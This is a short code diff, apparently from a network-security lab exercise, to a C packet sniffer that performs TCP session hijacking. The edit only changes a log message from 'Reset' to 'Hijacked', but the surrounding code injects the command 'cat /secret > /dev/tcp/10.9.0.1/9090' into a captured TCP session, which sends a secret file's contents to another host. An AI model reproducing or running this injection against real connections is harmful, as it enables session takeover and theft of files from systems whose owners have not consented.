@@ -149,8 +149,9 @@ void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
 			u_short dst_port = ntohs(tcp_pkt->header.dest);
 			u_long seq = ntohl(tcp_pkt->header.ack_seq);
 
-			printf("Reset (src=%s:%hu, dst=%s:%hu) with sequence number %lu\n",
-				   src_ip, src_port, dst_ip, dst_port, seq);
+			printf(
+				"Hijacked (src=%s:%hu, dst=%s:%hu) with sequence number %lu\n",
+				src_ip, src_port, dst_ip, dst_port, seq);
 
 			send_command(src_ip, src_port, dst_ip, dst_port, seq,
 						 "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n");
